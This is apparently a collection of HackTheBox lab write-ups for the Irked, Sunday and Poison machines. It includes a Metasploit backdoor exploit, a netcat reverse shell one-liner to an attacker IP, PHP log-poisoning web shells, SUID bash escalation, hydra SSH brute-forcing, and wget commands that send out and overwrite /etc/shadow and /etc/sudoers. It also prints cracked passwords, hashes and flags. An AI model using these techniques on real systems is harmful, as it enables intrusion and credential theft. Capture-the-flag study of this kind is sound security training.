msf6 &amp;gt; use 0 msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &amp;gt; Set OPTIONS Set RHOSTS msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &amp;gt; set RHOSTS 10.10.10.117 RHOSTS =&amp;gt; 10.10.10.117 Set RPORT msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &amp;gt; set RPORT 6697 RPORT =&amp;gt; 6697 Set Payload msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &amp;gt; set payload payload/cmd/unix/reverse payload =&amp;gt; cmd/unix/reverse Set LHOST msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &amp;gt; set LHOST tun0 LHOST =&amp;gt; 10.10.14.17 Demo - UnrealIRCd 3.2.8.1 Backdoor Command Execution w/ Metasploit TCP/6697, 8067, 65534 (IRC) - UnrealIRCd 3.2.8.1 Backdoor Command Execution w/o Metasploit Search for unrealIRCd 3.2.8.1 exploits Google: unrealIRCd 3.2.8.1 -hackthebox -irked Download exploit Change payload to your IP address &amp;amp; Port Start listener &amp;amp; run exploit ┌──(root💀kali)-[~/htb/irked/10.10.10.117/exploit] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 ┌──(root💀kali)-[~/htb/irked/10.10.10.117/exploit] └─# python exploit.py MADE BY :- SARTHAK Referenced by:- Metasploit source code NOTE:-I MADE THIS DUE TO PEOPLE PREPARING FOR OSCP WANT TO DO EXPLOITATION MANUALLY AS WELL AS THE EXPLOIT-DB EXPLOIT DOESN&#39;T SEEM TO BE WORKING IDK WHY :( Sending payload baby :) Eyes on netcat sire 10...9...8...7...6...5..4..3...2..1..HAHA IT WILL COME :) Demo - UnrealIRCd 3.2.8.1 Backdoor Command Execution w/o Metasploit Privilege EscalationDjmardov - Via Image Forensics Found something interesting on djmardov home directory ircd@irked:/home/djmardov$ find . 2&amp;gt;/dev/null . ./.dbus ./.profile ./.bash_history ./.ssh ./Downloads ./Documents ./Documents/user.txt ./Documents/.backup ./.gnupg ./Desktop ./.cache ./.gconf ./.local ./.ICEauthority ... ./Documents/.backup View contents of .backup ircd@irked:/home/djmardov$ cat ./Documents/.backup Super elite steg backup pw UPupDOWNdownLRlrBAbaSSss steg - Steganography is the practice of concealing a message within another message This is a possibly a steghide hint The text does not look encoded/encrypted On root directory of the webserver, there is an image file irked.jpg, download it ┌──(root💀kali)-[~/htb/irked/10.10.10.117/loot] └─# wget http://irked.htb/irked.jpg Image Forensics Binwalk Found nothing Exiftool Found nothing, no comments Steghide ┌──(root💀kali)-[~/htb/irked/10.10.10.117/loot] └─# steghide --extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss wrote extracted data to &quot;pass.txt&quot;. View pass.txt ┌──(root💀kali)-[~/htb/irked/10.10.10.117/loot] └─# cat pass.txt Kab6h+m+bbp2J:HG SSH to Djmardov w/ djmardov:Kab6h+m+bbp2J:HG ┌──(root💀kali)-[~/htb/irked/10.10.10.117/loot] └─# sshpass -p &#39;Kab6h+m+bbp2J:HG&#39; ssh djmardov@irked.htb Root - Via Unknown SUID binary Found something interesting w/ linpeas.sh /usr/bin/viewuser Transfer to kali for analysis ltrace - to see the libraries that are called ┌──(root💀kali)-[~/htb/irked/10.10.10.117/loot] └─# ltrace ./viewusers __libc_start_main(0x5659257d, 1, 0xffceba04, 0x56592600 &amp;lt;unfinished ...&amp;gt; puts(&quot;This application is being devleo&quot;...This application is being devleoped to set and test user permissions ) = 69 puts(&quot;It is still being actively devel&quot;...It is still being actively developed ) = 37 system(&quot;who&quot;root tty7 2022-08-25 02:16 (:0) root pts/4 2022-09-10 04:35 (tmux(351768).%58) root pts/3 2022-09-10 05:56 (tmux(351768).%66) root pts/7 2022-09-10 15:25 (tmux(351768).%67) root pts/2 2022-09-10 05:22 (tmux(351768).%63) root pts/0 2022-09-10 04:30 (tmux(351768).%54) &amp;lt;no return ...&amp;gt; --- SIGCHLD (Child exited) --- &amp;lt;... system resumed&amp;gt; ) = 0 setuid(0) = 0 system(&quot;/tmp/listusers&quot;sh: 1: /tmp/listusers: not found &amp;lt;no return ...&amp;gt; --- SIGCHLD (Child exited) --- &amp;lt;... system resumed&amp;gt; ) = 32512 +++ exited (status 0) +++ /tmp/listusers is being executed by system strings - view readable content ┌──(root💀kali)-[~/htb/irked/10.10.10.117/loot] └─# strings viewusers ... /tmp/listusers ... Exploiting /usr/bin/viewusers How does it work? Since the binary /usr/bin/viewusers has a SUID bit and is owned by root, when executed by any user, it will be executed by root. /usr/bin/viewusers is executing /tmp/listusers but it does not exist. Since listusers resides in the /tmp directory we have RWX access to it, and can create a bashscript that will create a bash shell w/ SUID bit set, privilege escalating us to root Create /tmp/listusers, script ircd@irked:/$ cat /tmp/listusers #!/bin/bash cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; Make it executable ircd@irked:/$ chmod 777 /tmp/listusers Execute /usr/bin/viewusers ircd@irked:/$ /usr/bin/viewuser This application is being devleoped to set and test user permissions It is still being actively developed (unknown) :0 2022-09-09 17:41 (:0) ircd@irked:/$ ls -la /tmp | grep rootbash -rwsr-xr-x 1 root ircd 1105840 Sep 10 04:31 rootbash Execute /tmp/rootbash ircd@irked:/$ /tmp/rootbash -p User &amp;amp; Root Flag rootbash-4.3# cd djmardov rootbash-4.3# ls Desktop Documents Downloads Music Pictures Public Templates user.txt Videos rootbash-4.3# cat user.txt 39235faac8fcac0052060cd10b113114 rootbash-4.3# ls pass.txt root.txt rootbash-4.3# cat root.txt 20cf70dc16a04f7054465aab92169563 rootbash-4.3# cat pass.txt Kab6h+m+bbp2J:HG Demo - /usr/bin/viewusers Privilege Escalation " }, { "title": "HackTheBox - Sunday", "url": "/posts/Sunday/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "linux-priv-esc/sudo/gtfo-bin", "date": "2022-09-03 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a finger user enumeration, revealing user sunny, sammy on sunday.htb, allowing us to bruteforce w/ hydra, obtaining a low-privilege/sunny shell.On the home directory of user sunny, .bash_history reveals an interesting file /backups/shadow.backup, containing hashes for user sammy, w/ hashcat, we are able to crack the hash, privilege escalating us to sammy.User sammy is able to run wget as root, allowing us to exfiltrate /etc/shadow file w/ WGET --post-file=/etc/shadow, change root’s hash w/ a known hash, and replace sunday.htb /etc/shadow file w/ our edited shadow file w/ WGET -O /etc/shadow, allowing us to switch to root w/ sammy’s password Column Details Box Name Sunday IP 10.10.10.76 Points - Difficulty Easy Creator Agent22 Release Date 28-Apr-2018 ReconTCP/79 (Finger)Finger┌──(root💀kali)-[~/htb/sunday]└─# finger @sunday.htbNo one logged on┌──(root💀kali)-[~/htb/sunday]└─# finger admin@sunday.htbLogin Name TTY Idle When Whereadm Admin &amp;lt; . . . . &amp;gt;dladm Datalink Admin &amp;lt; . . . . &amp;gt;netadm Network Admin &amp;lt; . . . . &amp;gt;netcfg Network Configuratio &amp;lt; . . . . &amp;gt;dhcpserv DHCP Configuration A &amp;lt; . . . . &amp;gt;ikeuser IKE Admin &amp;lt; . . . . &amp;gt;lp Line Printer Admin &amp;lt; . . . . &amp;gt;┌──(root💀kali)-[~/htb/sunday]└─# finger user@sunday.htbLogin Name TTY Idle When Whereaiuser AI User &amp;lt; . . . . &amp;gt;openldap OpenLDAP User &amp;lt; . . . . &amp;gt;nobody NFS Anonymous Access &amp;lt; . . . . &amp;gt;noaccess No Access User &amp;lt; . . . . &amp;gt;nobody4 SunOS 4.x NFS Anonym &amp;lt; . . . . &amp;gt;TCP/6787 (HTTPS)FFUF302 GET 7l 18w 217c https://10.10.10.76:6787/solaris solarisInitial FootholdTCP/6787 (HTTPS) Nothing interesting is foundTCP/79 (Finger) - User Enumeration Enumerate users w/ finger-user-enum.pl Download it from pentestmonkey Valid vs Invalid usernames $ telnet 10.0.0.1 79 Trying 10.0.0.1... Connected to 10.0.0.1. Escape character is &#39;^]&#39;. root Login Name TTY Idle When Where root Super-User console 2:05 Wed 07:23 Connection closed by foreign host. $ telnet 10.0.0.1 79 Trying 10.0.0.1... Connected to 10.0.0.1. Escape character is &#39;^]&#39;. blah Login Name TTY Idle When Where blah ??? Connection closed by foreign host. Run finger-user-enum.pl ┌──(root💀kali)-[~/htb/sunday/10.10.10.76/exploit/finger-user-enum-1.0] └─# perl finger-user-enum.pl -U /usr/share/wordlists/SecLists/Usernames/compiled.txt -t sunday.htb ... sammy@sunday.htb: sammy ??? ssh &amp;lt;Apr 13 13:38&amp;gt; 10.10.14.13 sunny@sunday.htb: sunny ??? ssh &amp;lt;Apr 13 13:52&amp;gt; 10.10.14.13 ... Usernames that looks like actual users (not service accounts) on the machine sammy sunny Verify w/ finger ┌──(root💀kali)-[~/htb/sunday/10.10.10.76/exploit/finger-user-enum-1.0] └─# finger sunny@$ip Login Name TTY Idle When Where sunny ??? ssh &amp;lt;Sep 2 19:46&amp;gt; 10.10.14.31 ┌──(root💀kali)-[~/htb/sunday/10.10.10.76/exploit/finger-user-enum-1.0] └─# finger sammy@$ip Login Name TTY Idle When Where sammy ??? ssh &amp;lt;Apr 13 13:38&amp;gt; 10.10.14.13 TCP/22022 (SSH) - Bruteforce Bruteforce SSH w/ hydra ┌──(root💀kali)-[~/htb/sunday/10.10.10.76/exploit] └─# cat username.txt sunny sammy ┌──(root💀kali)-[~/htb/sunday/10.10.10.76/exploit] └─# hydra -L username.txt -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt ssh://sunday.htb:22022 -VI -e nsr -t 64 [22022][ssh] host: sunday.htb login: sunny password: sunday sunny:sunday SSH w/ sunny:sunday ┌──(root💀kali)-[~/htb/sunday/10.10.10.76/exploit] └─# sshpass -p &#39;sunday&#39; ssh sunny@$ip -p 22022 User Flag a3d9498027ca5187ba1793943ee8a598 Privilege EscalationSammy - Via Crack Hash Found something interesting w/ LinEnum.sh /backup/shadow.backup View shadow.backup sunny@sunday:/tmp$ cat /backup/shadow.backup mysql:NP::::::: openldap:*LK*::::::: webservd:*LK*::::::: postgres:NP::::::: svctag:*LK*:6445:::::: nobody:*LK*:6445:::::: noaccess:*LK*:6445:::::: nobody4:*LK*:6445:::::: sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445:::::: sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636:::::: SHA-256 Crypt - name-that-hash Crack w/ hashcat ┌──(root💀kali)-[~/htb/sunday/10.10.10.76/exploit] └─# hashcat -a 0 -m 7400 hashes /usr/share/wordlists/rockyou.txt --show $5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:cooldude! $5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:sunday sammy:cooldude! Switch to sammy w/ sammy:cooldude! sunny@sunday:/tmp$ su sammy Root - Via WGET, replace Shadow file Check sudo access for sammy sammy@sunday:/tmp$ sudo -l User sammy may run the following commands on sunday: (ALL) ALL (root) NOPASSWD: /usr/bin/wget wget - has a GTFOBins Entry Using wget to privilege escalate How does it work? wget has a --post-file=&amp;lt;file&amp;gt; option that allows us to send the content of the specified file. Since wget is running as root because of sudo, we are able to post /etc/shadow, /etc/sudoers or /root.txt to our ncat listener. /etc/shadow Once we obtained /etc/shadow file, we are able to crack the hash and login to root OR We can replace the password hash for root and use wget -O option to overwrite /etc/shadow on sunday.htb /etc/sudoers Once we obtained /etc/sudoers, add a sudoers entry for any user to run su as root. /root/troll Earlier for user sammy, we are able to run troll as root, replace it w/ a reverse shell Start listener ┌──(root💀kali)-[~/htb/sunday/10.10.10.76/loot] └─# nc -nvlp 4444 &amp;gt; shadow POST /etc/shadow file to kali sammy@sunday:/tmp$ sudo /usr/bin/wget --post-file=/etc/shadow 10.10.14.31:4444 ┌──(root💀kali)-[~/htb/sunday/10.10.10.76/loot] └─# nc -nvlp 4444 &amp;gt; shadow.og Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.76. Ncat: Connection from 10.10.10.76:55944. View shadow file ┌──(root💀kali)-[~/htb/sunday/10.10.10.76/loot] └─# cat shadow POST / HTTP/1.1 User-Agent: Wget/1.19.5 (solaris2.11) Accept: */* Accept-Encoding: identity Host: 10.10.14.31:4444 Connection: Keep-Alive Content-Type: application/x-www-form-urlencoded Content-Length: 746 root:$5$rounds=10000$fIoXFZ5A$k7PlwsiH0wAyVOcKaAYl/Mo1Iq6XYfJlFXs58aA4Sr3:18969::::::263424 daemon:NP:6445:::::: bin:NP:6445:::::: sys:NP:6445:::::: adm:NP:6445:::::: dladm:*LK*:17760:::::: netadm:*LK*:17760:::::: netcfg:*LK*:17760:::::: dhcpserv:*LK*:17760:::::: ftp:*LK*:17760:::::: sshd:*LK*:17760:::::: smmsp:NP:17760:::::: aiuser:*LK*:17760:::::: ikeuser:*LK*:17760:::::: lp:NP:6445:::::: openldap:NP:17760:::::: webservd:*LK*:17760:::::: unknown:*LK*:17760:::::: pkg5srv:NP:17760:::::: nobody:*LK*:17760:::::: noaccess:*LK*:6445:::::: nobody4:*LK*:6445:::::: sammy:$5$rounds=10000$lUpW4prM$aKFJxjI7vlcj5DDvwIgYGy707a84mIEi0ZQK3XIDqT2:18980:::::: sunny:$5$rounds=10000$bioFdRBN$1TTdfQFfhjNicxWhH07f8BIHABZ8di01CXWYTT5rMn9:18980::::::2661408 Replace root’s hash w/ sunny’s hash root:&amp;lt;SUNNY&#39;s HASH&amp;gt;:18969::::::263424 So that root’s password is changed to sunny’s Remember to remove HTTP HEADER Start python web server hosting our shadow file ┌──(root💀kali)-[~/htb/sunday/10.10.10.76/loot] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Replace sunday.htb’s /etc/shadow file w/ our shadow file sammy@sunday:/tmp$ sudo /usr/bin/wget http://10.10.14.31/shadow -O /etc/shadow SSH w/ root:sunday ┌──(root💀kali)-[~/htb/sunday/10.10.10.76/exploit] └─# sshpass -p &#39;sunday&#39; ssh root@$ip -p 22022 Root Flag root@sunday:~# cat root.txt fb40fab61d99d37536daeec0d97af9b8 Privilege Escalation - 2Root - Via WGET, replace sudoers file Instead of replacing shadow file, replace /etc/sudoers Start listener POST /etc/sudoers file to kali sammy@sunday:/tmp$ sudo /usr/bin/wget --post-file=/etc/sudoers 10.10.14.31:4444 ┌──(root💀kali)-[~/htb/sunday/10.10.10.76/loot] └─# nc -nvlp 4444 &amp;gt; sudoers_og Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.76. Ncat: Connection from 10.10.10.76:44997. Replace /usr/bin/wget to /usr/bin/su ## Read drop-in files from /etc/sudoers.d ## (the &#39;#&#39; here does not indicate a comment) #includedir /etc/sudoers.d sunny ALL=(root) NOPASSWD: /root/troll sammy ALL=(root) NOPASSWD: /usr/bin/su Remember to remove HTTP HEADER Start python web server hosting our sudoers file ┌──(root💀kali)-[~/htb/sunday/10.10.10.76/loot] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Replace sunday.htb’s /etc/sudoers w/ our sudoers file -bash-4.4$ sudo /usr/bin/wget http://10.10.14.31/sudoers -O /etc/sudoers Check sudo access -bash-4.4$ sudo -l User sammy may run the following commands on sunday: (ALL) ALL (root) NOPASSWD: /usr/bin/su (root) NOPASSWD: /usr/bin/wget Obtain root -bash-4.4$ sudo su Privilege Escalation - 3Root - Via WGET, replace troll binary Replace /root/troll w/ a script to create rootbash rootbash #!/bin/bash cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; POST /etc/sudoers file -bash-4.4$ sudo /usr/bin/wget http://10.10.14.31/troll -O /root/troll Obtain root sunny@sunday:~$ /tmp/rootbash -p " }, { "title": "HackTheBox - Poison", "url": "/posts/Poison/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "exploit/file-inclusion/lfi", "date": "2022-09-02 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a web enumeration, browse.php is enumerated and is susceptible to LFI2RCE via Apache log poisoning, allowing us to obtain a low-privilege/www-data shell.On the web directory, there is a file called pwdbackup.txt that is base64 encoded 13 times, decoding it reveals user charix password, privilege escalating us to charixAfter enumerating the system w/ linpeas.sh, there is a service called VNC running as root, listening on port 5801 &amp;amp; 5901 locally. Also, there is a file called secret.zip that can be unzipped by specifying charix password, revealing a file called secret. By using SSH tunnel and specifying the password file (secret), we are able to access VNC that has a root shell, privilege escalating us to root. Column Details Box Name Poison IP 10.10.10.84 Points - Difficulty Medium Creator Charix Release Date 24-Mar-2018 ReconTCP/80 (HTTP)FFUF - common.txt200 GET 4l 30w 321c http://10.10.10.84/browse.php403 GET 9l 24w 222c http://10.10.10.84/cgi-bin/.html200 GET 12l 30w 289c http://10.10.10.84/index.php200 GET 1l 15w 157c http://10.10.10.84/info.php200 GET 983l 1883w 0c http://10.10.10.84/ini.php200 GET 715l 4157w 0c http://10.10.10.84/phpinfo.php browse.php cgi-bin info.php phpinfo.php ini.phpInitial Foothold - 1TCP/80 (HTTP) - LFI2RCE via Apache Log Poisoning Proceed to http://poison.htb/browse.php, it is susceptible to LFI Include files that could lead to RCE ┌──(root💀kali)-[~/htb/poison] └─# ffuf -u http://poison.htb/browse.php?file=../../../../../../..FUZZ -w /usr/share/wordlists/LFI/file_inclusion_linux.txt -fw 16,34,31 ../../../../../../../../../../../../../etc/group [Status: 200, Size: 546, Words: 8, Lines: 41] ../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1894, Words: 58, Lines: 33] ../../var/log/httpd-access.log [Status: 200, Size: 766232, Words: 68690, Lines: 3822] /usr/local/etc/php.ini [Status: 200, Size: 48, Words: 3, Lines: 2] /etc/termcap [Status: 200, Size: 208384, Words: 11942, Lines: 4668] /usr/ports/ftp/pure-ftpd/ [Status: 200, Size: 421, Words: 32, Lines: 5] /var/log [Status: 200, Size: 388, Words: 32, Lines: 5] /var/log/messages [Status: 200, Size: 76, Words: 11, Lines: 2] /var/run/httpd.pid [Status: 200, Size: 4, Words: 1, Lines: 2] /var/log/Xorg.0.log [Status: 200, Size: 118208, Words: 18481, Lines: 3361] /var/log/httpd-access.log [Status: 200, Size: 1026829, Words: 94117, Lines: 5242] /var/log/httpd-access.log potentially we can poison apache logs by inserting webshell in the User-Agent field Check if /var/log/httpd-access.log can be accessed After confirming it, you should reset the machine so that page loads faster Insert webshell ┌──(root💀kali)-[~/htb/poison] └─# curl &quot;http://poison.htb/&quot; -H &quot;User-Agent: &amp;lt;?php system(\\$_GET[&#39;c&#39;]); ?&amp;gt;&quot;^C Test RCE ┌──(root💀kali)-[~/htb/poison] └─# curl http://poison.htb/browse.php?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flog%2Fhttpd-access.log&amp;amp;c=id;whoami Start listener URL Encode payload ┌──(root💀kali)-[~/htb/poison/10.10.10.84/exploit] └─# hURL -U &#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.31 4444 &amp;gt;/tmp/f&#39; Original :: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.31 4444 &amp;gt;/tmp/f URL ENcoded :: rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.31%204444%20%3E%2Ftmp%2Ff Invoke reverse shell ┌──(root💀kali)-[~/htb/poison/10.10.10.84/exploit] └─# curl &#39;http://poison.htb/browse.php?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flog%2Fhttpd-access.log&amp;amp;c=id;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.31%204444%20%3E%2Ftmp%2Ff&#39; Obtained www-data shellInitial Foothold - 2TCP/80 (HTTP) - LFI2RCE via phpinfo phpinfo RCE checklist A LFI Vulnerability (/browse.php?file=&amp;lt;LFI&amp;gt;) A page where phpinfo is displayed (/phpinfo.php) file_uploads = on able to write in the /tmp directory Ensure phpinfo.php exists ┌──(root💀kali)-[~/htb/poison/10.10.10.84/loot] └─# curl http://poison.htb/phpinfo.php -v HTTP 200 Ensure file_uploads = On PHP is going to accepts any file that gets uploaded into a cache directory, this is so because users are not able to access those files, but w/ LFI exploit, they are able to do so, able to do LFI2RCE. Intercept phpinfo.php w/ burpsuite Check if we are able to temporarily upload a file Change GET to POST Add to end of HEADER Content-Type: multipart/form-data; boundary=--asdf ----asdf Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot; Content-Type: text/plain Security Test ----asdf It works, a temporary file is created phpinfo RCE checklist A LFI Vulnerability (/browse.php?file=&amp;lt;LFI&amp;gt;) A page where phpinfo is displayed (/phpinfo.php) file_uploads = on able to write in the /tmp directory phpinfo RCE Download phpinfolfi.py Few things to change in phpinfolfi.py PAYLOAD LFIREQ tmp_name =&amp;gt; Run exploit ┌──(root💀kali)-[~/htb/poison/10.10.10.84/exploit] └─# python phpinfolfi.py 10.10.10.84 80 1000 Shell Obtained Privilege EscalationCharix - Via Decoding base64 encoded password There is a base64 encoded file pwdbackup.txt ┌──(root💀kali)-[~/htb/poison/10.10.10.84/loot] └─# base64 -d pwdbackup_encoded.txt Vm0wd2QyUXlVWGxXYTFwUFZsZFNjRlZ0TVZOWFJsbDNXa2M1VjJKR2JETlhhMUpUVmpGYWMySkVU bGhoTVVwVVZtcEdTMlJIVmtkWApiRnBPWVd0RmVGWnRjRXRUTVU1SVZtdFdVZ3BpVlZwWVZtMTRj MDB4WkZkYVJGSlVUV3N4TkZkcmFGZGhVWEJUWWxaS1VGZFhNVFJTCk1EQjRWMjVTYTFKc2NITlZi WGh6VGxaYVNHUklUbWhWV0VKVVdXeGFTMlF4V25Sa1IwWmFDbFpzV2xoWGExcHJXVlpLUjFOdFJs ZGgKYTBZMFZHdGFZVk5GTlZkYVIyaFdWMFZLVlZkWGVHRlRNVnBYVjJ0a1ZtRXpVbkJEYXpGeVlr UlNWMDFxVmt4V01uTjNaVmRHUjFWcwpjR2tLVW01Q2IxZHNaRFJXTWxKR1RsWmtZVkl5YUZOV01G WkxWbFprV0dWSGRHbE5iRXA2VjJ0YWExWnRSWHBWYms1RVlsVndXRll5CmRHOVdNREZ4Vm10NFdG WnNjRXhWYWtaUFl6Rldjd3BXYkdOTFdXdG9RbVZzV25SalJXUldUVlpzTkZZeU5VOVpWa2w1WVVa a1YwMUcKV2t4V2JGcGhaRVV4VlZGdGRFNWhNbmN3VmpKMGIxUXhiRmRVYTJoV1lrVTFSVmxzVmxw TmJGcDBDbVZIT1ZkaVZYQkpXVlZvZDFZdwpNWEZTYkdoaFVsZFNXRlZxUms5amQzQmhVbTFPVEZk WGVGWmtNbEY0VjJ0V1UySkhVbFpVVjNSM1pXeFdXR1ZHWkZWaVJYQmFWa2QwCk5GSkdjRFlLVFVS c1JGcDZNRGxEWnowOUNnPT0K It is base64 encoded multiple times Recurisvely base64 decode pwdbackup.txt # Script to recursively decode base64 encoded string state=$(&amp;lt;pwdbackup_encoded.txt) for i in {1..20}; do state=$(&amp;lt;&amp;lt;&amp;lt;&quot;$state&quot; base64 --decode) echo $state done ┌──(root💀kali)-[~/htb/poison/10.10.10.84/loot] └─# ./decode.sh Vm0wd2QyUXlVWGxXYTFwUFZsZFNjRlZ0TVZOWFJsbDNXa2M1VjJKR2JETlhhMUpUVmpGYWMySkVU bGhoTVVwVVZtcEdTMlJIVmtkWApiRnBPWVd0RmVGWnRjRXRUTVU1SVZtdFdVZ3BpVlZwWVZtMTRj MDB4WkZkYVJGSlVUV3N4TkZkcmFGZGhVWEJUWWxaS1VGZFhNVFJTCk1EQjRWMjVTYTFKc2NITlZi WGh6VGxaYVNHUklUbWhWV0VKVVdXeGFTMlF4V25Sa1IwWmFDbFpzV2xoWGExcHJXVlpLUjFOdFJs ZGgKYTBZMFZHdGFZVk5GTlZkYVIyaFdWMFZLVlZkWGVHRlRNVnBYVjJ0a1ZtRXpVbkJEYXpGeVlr UlNWMDFxVmt4V01uTjNaVmRHUjFWcwpjR2tLVW01Q2IxZHNaRFJXTWxKR1RsWmtZVkl5YUZOV01G WkxWbFprV0dWSGRHbE5iRXA2VjJ0YWExWnRSWHBWYms1RVlsVndXRll5CmRHOVdNREZ4Vm10NFdG WnNjRXhWYWtaUFl6Rldjd3BXYkdOTFdXdG9RbVZzV25SalJXUldUVlpzTkZZeU5VOVpWa2w1WVVa a1YwMUcKV2t4V2JGcGhaRVV4VlZGdGRFNWhNbmN3VmpKMGIxUXhiRmRVYTJoV1lrVTFSVmxzVmxw TmJGcDBDbVZIT1ZkaVZYQkpXVlZvZDFZdwpNWEZTYkdoaFVsZFNXRlZxUms5amQzQmhVbTFPVEZk WGVGWmtNbEY0VjJ0V1UySkhVbFpVVjNSM1pXeFdXR1ZHWkZWaVJYQmFWa2QwCk5GSkdjRFlLVFVS c1JGcDZNRGxEWnowOUNnPT0K Vm0wd2QyUXlWa1pPVldScFVtMVNXRll3Wkc5V2JGbDNXa1JTVjFac2JETlhhMUpUVmpGS2RHVkdX bFpOYWtFeFZtcEtTMU5IVmtWUgpiVVpYVm14c00xZFdaRFJUTWsxNFdraFdhUXBTYlZKUFdXMTRS MDB4V25Sa1JscHNVbXhzTlZaSGRITmhVWEJUWWxaS2QxWnRkR0ZaClZsWlhXa1prWVZKR1NtRldh a0Y0VGtaYVNFNVdaR2hWV0VKVVdXeGFTMVpXV2tkVmEzUnBDazFyYkRSV01qVkxWMnN3ZVdGR1Vs cGkKUm5Cb1dsZDRWMlJGTlZkYVIyaFNWMFZLVlZkWGVHdGlNbEp6V2taa1ZtRXpVbk5EYlVwWFYy dG9WMDFxVmt4WFZscExVakZPYzFWcwpWbGNLWWtoQmVsWnRjRWRWTVZsNFYyNU9ZVkl5YUZkV01G WkxWbFphZEUxVVFtdE5hMncwVjJ0b1QxbFdUa2hWYkU1RVlsVlpNbFp0CmVHOVdiVXBJWVVod1Yw MXFSbGhhUldSWFVqRk9jd3BhUm1OTFdXeFZkMlF4V2tWU2JHUlZUV3R3ZWxWWGVGZFViRXBaVkd0 NFJGcDYKTURsRFp6MDlDZz09Cg== Vm0wd2QyVkZOVWRpUm1SWFYwZG9WbFl3WkRSV1ZsbDNXa1JTVjFKdGVGWlZNakExVmpKS1NHVkVR bUZXVmxsM1dWZDRTMk14WkhWaQpSbVJPWW14R00xWnRkRlpsUmxsNVZHdHNhUXBTYlZKd1ZtdGFZ VlZXWkZkYVJGSmFWakF4TkZaSE5WZGhVWEJUWWxaS1ZWWkdVa3RpCk1rbDRWMjVLV2sweWFGUlpi RnBoWld4V2RFNVdaR2hSV0VKVVdXeGtiMlJzWkZkVmEzUnNDbUpXV2toV01qVkxXVlpLUjFOc1Vs VlcKYkhBelZtcEdVMVl4V25OYVIyaFdWMFZLVlZadE1UQmtNa2w0V2toT1lWTkhVbE5EYlVZMlZt eG9WbUpIYUhwV01qRlhaRWRXUjFOcwpaRmNLWWxVd2QxWkVSbGRVTWtwelVXeFdUbEpZVGt4RFp6 MDlDZz09Cg== Vm0wd2VFNUdiRmRXV0doVlYwZDRWVll3WkRSV1JteFZVMjA1VjJKSGVEQmFWVll3WVd4S2MxZHVi RmROYmxGM1ZtdFZlRll5VGtsaQpSbVJwVmtaYVVWZFdaRFJaVjAxNFZHNVdhUXBTYlZKVVZGUkti Mkl4V25KWk0yaFRZbFphZWxWdE5WZGhRWEJUWWxkb2RsZFdVa3RsCmJWWkhWMjVLWVZKR1NsUlVW bHAzVmpGU1YxWnNaR2hWV0VKVVZtMTBkMkl4WkhOYVNHUlNDbUY2VmxoVmJHaHpWMjFXZEdWR1Ns ZFcKYlUwd1ZERldUMkpzUWxWTlJYTkxDZz09Cg== Vm0weE5GbFdWWGhVV0d4VVYwZDRWRmxVU205V2JHeDBaVVYwYWxKc1dubFdNblF3VmtVeFYyTkli RmRpVkZaUVdWZDRZV014VG5WaQpSbVJUVFRKb2IxWnJZM2hTYlZaelVtNVdhQXBTYldodldWUktl bVZHV25KYVJGSlRUVlp3VjFSV1ZsZGhVWEJUVm10d2IxZHNaSGRSCmF6VlhVbGhzV21WdGVGSldW bU0wVDFWT2JsQlVNRXNLCg== Vm0xNFlWVXhUWGxUV0d4VFlUSm9WbGx0ZUV0alJsWnlWMnQwVkUxV2NIbFdiVFZQWVd4YWMxTnVi RmRTTTJob1ZrY3hSbVZzUm5WaApSbWhvWVRKemVGWnJaRFJTTVZwV1RWVldhUXBTVmtwb1dsZHdR azVXUlhsWmVteFJWVmM0T1VOblBUMEsK Vm14YVUxTXlTWGxTYTJoVllteEtjRlZyV2t0VE1WcHlWbTVPYWxac1NubFdSM2hoVkcxRmVsRnVh RmhoYTJzeFZrZDRSMVpWTVVWaQpSVkpoWldwQk5WRXlZemxRVVc4OUNnPT0K VmxaU1MySXlSa2hVYmxKcFVrWktTMVpyVm5OalZsSnlWR3hhVG1FelFuaFhha2sxVkd4R1ZVMUVi 